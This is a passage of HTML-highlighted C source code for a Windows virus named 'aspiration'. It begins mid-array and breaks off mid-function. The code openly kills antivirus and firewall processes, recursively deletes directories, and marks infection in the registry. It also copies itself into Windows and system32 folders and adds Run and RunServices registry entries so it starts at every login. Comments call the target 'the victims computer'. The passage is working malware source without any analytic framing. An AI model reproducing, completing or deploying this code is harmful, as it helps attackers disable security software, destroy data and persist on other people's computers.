    </span><span class="sc6">"pfwcon.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"zlclient.exe"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">};</span><span class="sc0">

</span><span class="sc1">/* Going through the array of processes and comparing the names with running processes, if
it matches, the process will be terminated */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">KillProcess</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">AVProcessList</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hProcSnap</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hProc</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PROCESSENTRY32</span><span class="sc0"> </span><span class="sc11">pe32</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">pe32</span><span class="sc10">.</span><span class="sc11">dwSize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">PROCESSENTRY32</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">hProcSnap</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CreateToolhelp32Snapshot</span><span class="sc10">(</span><span class="sc11">TH32CS_SNAPPROCESS</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">Process32First</span><span class="sc10">(</span><span class="sc11">hProcSnap</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">pe32</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc5">do</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">hProc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">OpenProcess</span><span class="sc10">(</span><span class="sc11">PROCESS_TERMINATE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">pe32</span><span class="sc10">.</span><span class="sc11">th32ProcessID</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">pe32</span><span class="sc10">.</span><span class="sc11">szExeFile</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">AVProcessList</span><span class="sc10">)==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">TerminateProcess</span><span class="sc10">(</span><span class="sc11">hProc</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hProc</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hProc</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Process32Next</span><span class="sc10">(</span><span class="sc11">hProcSnap</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">pe32</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Deleting a directory given to this function recursively */</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">DeleteDirectoryRecursive</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">szPathToDelete</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFind</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">w32FD</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szFileName</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
 
    </span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szFileName</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">szPathToDelete</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szFileName</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"\\*"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">hFind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc11">szFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">w32FD</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* As long as files and folders are found in a directory do this */</span><span class="sc0"> 
    </span><span class="sc5">do</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc1">/* Go on when the file name is NOT " . " and " .. " */</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!((</span><span class="sc11">strcmp</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">w32FD</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"."</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">strcmp</span><span class="sc10">((</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc11">w32FD</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">".."</span><span class="sc10">))))</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">continue</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc10">((</span><span class="sc11">strcpy_s</span><span class="sc10">(</span><span class="sc11">szFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szFileName</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">szPathToDelete</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szFileName</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc6">"\\"</span><span class="sc10">)));</span><span class="sc0">
        </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szFileName</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">w32FD</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">

        </span><span class="sc1">/* If the folder is a directoy than remove it or stop if it does'nt work */</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">w32FD</span><span class="sc10">.</span><span class="sc11">dwFileAttributes</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc10">)</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">DeleteDirectoryRecursive</span><span class="sc10">(</span><span class="sc11">szFileName</span><span class="sc10">))</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0"> 
                </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">hFind</span><span class="sc10">);</span><span class="sc0"> 
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> 
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc11">RemoveDirectory</span><span class="sc10">(</span><span class="sc11">szFileName</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc5">else</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc1">/* If the file we want to delete is readonly change file attributes, so we can delete it */</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">w32FD</span><span class="sc10">.</span><span class="sc11">dwFileAttributes</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_READONLY</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">_chmod</span><span class="sc10">(</span><span class="sc11">szFileName</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">_S_IWRITE</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc1">/* Delete the file or stop if it doesnt work */</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">szFileName</span><span class="sc10">))</span><span class="sc0"> 
            </span><span class="sc10">{</span><span class="sc0">  
                </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">hFind</span><span class="sc10">);</span><span class="sc0"> 
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> 
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">hFind</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">w32FD</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">hFind</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Remove the whole directory now */</span><span class="sc0">
    </span><span class="sc11">RemoveDirectory</span><span class="sc10">(</span><span class="sc11">szPathToDelete</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Check the registry for a special value telling us if the computer is infected */</span><span class="sc0">
</span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">TestIfInfected</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szBuf</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc11">DWORD</span><span class="sc0"> </span><span class="sc11">dwBufLength</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szBuf</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Aspiration"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegQueryValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"infected"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szBuf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">dwBufLength</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Check for "HKEY_LOCAL_MACHINE\Software\Aspiration\infected" = "infected" */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">szBuf</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]!=</span><span class="sc7">'i'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">szBuf</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]!=</span><span class="sc7">'n'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">szBuf</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]!=</span><span class="sc7">'f'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">szBuf</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]!=</span><span class="sc7">'e'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">szBuf</span><span class="sc10">[</span><span class="sc4">5</span><span class="sc10">]!=</span><span class="sc7">'c'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">szBuf</span><span class="sc10">[</span><span class="sc4">6</span><span class="sc10">]!=</span><span class="sc7">'t'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">szBuf</span><span class="sc10">[</span><span class="sc4">7</span><span class="sc10">]!=</span><span class="sc7">'e'</span><span class="sc0"> </span><span class="sc10">||</span><span class="sc0"> </span><span class="sc11">szBuf</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">]!=</span><span class="sc7">'d'</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* Write the key into the registry showing us that the computer is infected with the virus now */</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Infect</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szInfected</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"infected"</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Aspiration"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"infected"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szInfected</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szInfected</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc1">/* 
Copying to several locations on the computer:
-&gt; %windir%\system32\aspiration.exe
-&gt; %windir%\aspiration.exe
-&gt; %windir%\system32\Hell\aspiration.exe
-&gt; %windir%\Hell\aspiration.exe

Writing to several registry keys: HKEY_LOCAL_MACHINE and HKEY_CURRENT_USER:
(Creating keys if necessary)
-&gt;Software\\Microsoft\\Windows\\CurrentVersion\\Run
-&gt;Software\\Microsoft\\Windows\\CurrentVersion\\RunServices
-&gt;Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders
*/</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">InfRegCopy</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HMODULE</span><span class="sc0"> </span><span class="sc11">Mod</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFile</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szSysDir</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szWinDir</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szSysDir2</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szWinDir2</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szSysDir2File</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szWinDir2File</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">szVirusPath</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">

    </span><span class="sc11">Mod</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetModuleHandle</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc11">Mod</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szVirusPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szVirusPath</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">szSysDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDir</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">szWinDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szWinDir</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">szSysDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDir2</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">szWinDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szWinDir2</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">GetSystemDirectory</span><span class="sc10">(</span><span class="sc11">szSysDir2File</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDir2File</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">szWinDir2File</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szWinDir2File</span><span class="sc10">));</span><span class="sc0">

    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szSysDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\aspiration.exe"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szWinDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\aspiration.exe"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szSysDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\Hell"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szWinDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\Hell"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szSysDir2File</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\Hell\\aspiration.exe"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">strcat_s</span><span class="sc10">(</span><span class="sc11">szWinDir2File</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"\\Hell\\aspiration.exe"</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">CreateDirectory</span><span class="sc10">(</span><span class="sc11">szSysDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CreateDirectory</span><span class="sc10">(</span><span class="sc11">szWinDir2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Copy to the locations on the victims computer */</span><span class="sc0">
    </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">szVirusPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">szVirusPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szWinDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">szVirusPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir2File</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">szVirusPath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szWinDir2File</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">FALSE</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Create the registry keys to make sure that they exist when writing to them */</span><span class="sc0">
    </span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc1">/* Write all the necessary registry keys making our virus start (several times) every login of the user */</span><span class="sc0">
    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"aspiration"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szSysDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szSysDir</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"destiny"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">szWinDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">szWinDir</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">

    </span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Software\\Microsoft\\Windows\\CurrentVersion\\Run"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">KEY_SET_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
